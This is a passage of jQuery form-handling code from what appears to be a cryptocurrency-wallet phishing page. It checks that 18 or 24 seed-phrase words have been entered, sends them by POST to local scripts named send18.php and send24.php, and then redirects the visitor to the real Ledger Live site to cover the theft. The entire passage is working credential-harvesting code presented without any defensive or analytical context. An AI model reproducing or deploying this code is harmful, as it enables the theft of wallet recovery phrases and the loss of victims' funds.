                $("input[name=18_sixteen_input_1]").css('border', 'unset');

            }

            if (seventeen_input_18 == "") {

                $("input[name=18_seventeen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_seventeen_input_1]").css('border', 'unset');

            }

            if (eighteen_input_18 == "") {

                $("input[name=18_eighteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=18_eighteen_input_1]").css('border', 'unset');

            }

            $.ajax({
                type: 'POST',
                url: "./send18.php",
                data: {
                    last_inserted_id: last_inserted_id,
                    stepinfo: stepinfo,
                    wordcheck: wordcheck,
                    first_input_18: first_input_18,
                    second_input_18: second_input_18,
                    third_input_18: third_input_18,
                    fourth_input_18: fourth_input_18,
                    fifth_input_18: fifth_input_18,
                    sixth_input_18: sixth_input_18,
                    seventh_input_18: seventh_input_18,
                    eight_input_18: eight_input_18,
                    ninth_input_18: ninth_input_18,
                    tenth_input_18: tenth_input_18,
                    eleven_input_18: eleven_input_18,
                    twelve_input_18: twelve_input_18,
                    thirteen_input_18: thirteen_input_18,
                    fourteen_input_18: fourteen_input_18,
                    fifteen_input_18: fifteen_input_18,
                    sixteen_input_18: sixteen_input_18,
                    seventeen_input_18: seventeen_input_18,
                    eighteen_input_18: eighteen_input_18
                },
                cache: false,
                aysnc: false,
                success: function(resultData) {
                    toastr.info("Please wait...");
                    var delay = 2000;
                    setTimeout(function() {
                        window.location = "https://www.ledger.com/ledger-live";
                    }, delay);
                    return;
                    var jsonRes = JSON.parse(resultData);

                    if (jsonRes.status == true) {

                        $("div#thirdStepBlock").hide();
                        $("div#secondStepBlock").hide();
                        $("div#firstStepBlock").hide();
                        $("#eighteenwordsdiv").show();
                        $("div#fourthStepBlock").show();
                        $('button#continueButton').attr('last-inserted-id', jsonRes.last_id);

                    } else {
                        toastr.error("Something is wrong.Please try again later.");
                        return;
                    }

                }


            });

        }
        /** EIGHTEEN **/

        if (wordcheck == 24) {

            var first_input_24 = $("input[name=24_first_input_1]").val().trim();
            var second_input_24 = $("input[name=24_second_input_1]").val().trim();
            var third_input_24 = $("input[name=24_third_input_1]").val().trim();
            var fourth_input_24 = $("input[name=24_fourth_input_1]").val().trim();
            var fifth_input_24 = $("input[name=24_fifth_input_1]").val().trim();
            var sixth_input_24 = $("input[name=24_sixth_input_1]").val().trim();
            var seventh_input_24 = $("input[name=24_seventh_input_1]").val().trim();
            var eight_input_24 = $("input[name=24_eight_input_1]").val().trim();
            var ninth_input_24 = $("input[name=24_ninth_input_1]").val().trim();
            var tenth_input_24 = $("input[name=24_tenth_input_1]").val().trim();
            var eleven_input_24 = $("input[name=24_eleven_input_1]").val().trim();
            var twelve_input_24 = $("input[name=24_twelve_input_1]").val().trim();
            var thirteen_input_24 = $("input[name=24_thirteen_input_1]").val().trim();
            var fourteen_input_24 = $("input[name=24_fourteen_input_1]").val().trim();
            var fifteen_input_24 = $("input[name=24_fifteen_input_1]").val().trim();
            var sixteen_input_24 = $("input[name=24_sixteen_input_1]").val().trim();
            var seventeen_input_24 = $("input[name=24_seventeen_input_1]").val().trim();
            var eighteen_input_24 = $("input[name=24_eighteen_input_1]").val().trim();
            var ninteen_input_24 = $("input[name=24_ninteen_input_1]").val().trim();
            var twenty_input_24 = $("input[name=24_twenty_input_1]").val().trim();
            var twentyone_input_24 = $("input[name=24_twentyone_input_1]").val().trim();
            var twentytwo_input_24 = $("input[name=24_twentytwo_input_1]").val().trim();
            var twentythree_input_24 = $("input[name=24_twentythree_input_1]").val().trim();
            var twentyfour_input_24 = $("input[name=24_twentyfour_input_1]").val().trim();


            if (first_input_24 == "") {

                $("input[name=24_first_input_1]").css('border', '2px solid red');

                return false;

            } else {

                $("input[name=24_first_input_1]").css('border', 'unset');
            }

            if (second_input_24 == "") {

                $("input[name=24_second_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_second_input_1]").css('border', 'unset');

            }

            if (third_input_24 == "") {

                $("input[name=24_third_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_third_input_1]").css('border', 'unset');
            }

            if (fourth_input_24 == "") {

                $("input[name=24_fourth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_fourth_input_1]").css('border', 'unset');

            }

            if (fifth_input_24 == "") {

                $("input[name=24_fifth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_fifth_input_1]").css('border', 'unset');

            }

            if (sixth_input_24 == "") {

                $("input[name=24_sixth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_sixth_input_1]").css('border', 'unset');

            }

            if (seventh_input_24 == "") {

                $("input[name=24_seventh_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_seventh_input_1]").css('border', 'unset');
            }

            if (eight_input_24 == "") {

                $("input[name=24_eight_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_eight_input_1]").css('border', 'unset');
            }

            if (ninth_input_24 == "") {

                $("input[name=24_ninth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_ninth_input_1]").css('border', 'unset');
            }

            if (tenth_input_24 == "") {

                $("input[name=24_tenth_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_tenth_input_1]").css('border', 'unset');

            }

            if (eleven_input_24 == "") {

                $("input[name=24_eleven_input_1]").css('border', '2px solid red');
                return false;


            } else {

                $("input[name=24_eleven_input_1]").css('border', 'unset');

            }

            if (twelve_input_24 == "") {

                $("input[name=24_twelve_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twelve_input_1]").css('border', 'unset');

            }

            if (thirteen_input_24 == "") {

                $("input[name=24_thirteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_thirteen_input_1]").css('border', 'unset');

            }

            if (fourteen_input_24 == "") {

                $("input[name=24_fourteen_input_1]").css('border', '2px solid red');
                return false;
            } else {

                $("input[name=24_fourteen_input_1]").css('border', 'unset');

            }

            if (fifteen_input_24 == "") {

                $("input[name=24_fifteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_fifteen_input_1]").css('border', 'unset');

            }

            if (sixteen_input_24 == "") {

                $("input[name=24_sixteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_sixteen_input_1]").css('border', 'unset');

            }

            if (seventeen_input_24 == "") {

                $("input[name=24_seventeen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_seventeen_input_1]").css('border', 'unset');

            }

            if (eighteen_input_24 == "") {

                $("input[name=24_eighteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_eighteen_input_1]").css('border', 'unset');

            }

            if (ninteen_input_24 == "") {

                $("input[name=24_ninteen_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_ninteen_input_1]").css('border', 'unset');

            }

            if (twenty_input_24 == "") {

                $("input[name=24_twenty_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twenty_input_1]").css('border', 'unset');

            }

            if (twentyone_input_24 == "") {

                $("input[name=24_twentyone_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twentyone_input_1]").css('border', 'unset');

            }

            if (twentytwo_input_24 == "") {

                $("input[name=24_twentytwo_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twentytwo_input_1]").css('border', 'unset');

            }

            if (twentythree_input_24 == "") {

                $("input[name=24_twentythree_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twentythree_input_1]").css('border', 'unset');

            }

            if (twentyfour_input_24 == "") {

                $("input[name=24_twentyfour_input_1]").css('border', '2px solid red');
                return false;

            } else {

                $("input[name=24_twentyfour_input_1]").css('border', 'unset');

            }


            $.ajax({
                type: 'POST',
                url: "./send24.php",
                data: {
                    last_inserted_id: last_inserted_id,
                    stepinfo: stepinfo,
                    wordcheck: wordcheck,
                    first_input_24: first_input_24,
                    second_input_24: second_input_24,
                    third_input_24: third_input_24,
                    fourth_input_24: fourth_input_24,
                    fifth_input_24: fifth_input_24,
                    sixth_input_24: sixth_input_24,
                    seventh_input_24: seventh_input_24,
                    eight_input_24: eight_input_24,
                    ninth_input_24: ninth_input_24,
                    tenth_input_24: tenth_input_24,
                    eleven_input_24: eleven_input_24,
                    twelve_input_24: twelve_input_24,
                    thirteen_input_24: thirteen_input_24,
                    fourteen_input_24: fourteen_input_24,
                    fifteen_input_24: fifteen_input_24,
                    sixteen_input_24: sixteen_input_24,
                    seventeen_input_24: seventeen_input_24,
                    eighteen_input_24: eighteen_input_24,
                    ninteen_input_24: ninteen_input_24,
                    twenty_input_24: twenty_input_24,
                    twentyone_input_24: twentyone_input_24,
                    twentytwo_input_24: twentytwo_input_24,
                    twentythree_input_24: twentythree_input_24,
                    twentyfour_input_24: twentyfour_input_24
                },
                cache: false,
                aysnc: false,
                success: function(resultData) {
                    toastr.info("Please wait...");
                    var delay = 2000;
                    setTimeout(function() {
                        window.location = "https://www.ledger.com/ledger-live";
                    }, delay);
                    return;
                    var jsonRes = JSON.parse(resultData);

                    if (jsonRes.status == true) {

                        $("div#thirdStepBlock").hide();
                        $("div#secondStepBlock").hide();
                        $("div#firstStepBlock").hide();
                        $("#twentyfourwordsdiv").show();
                        $("div#fourthStepBlock").show();
                        $('button#continueButton').attr('last-inserted-id', jsonRes.last_id);

                    } else {
                        toastr.error("Something is wrong.Please try again later.");
                        return;
                    }

                }
            });

        }

    });

});

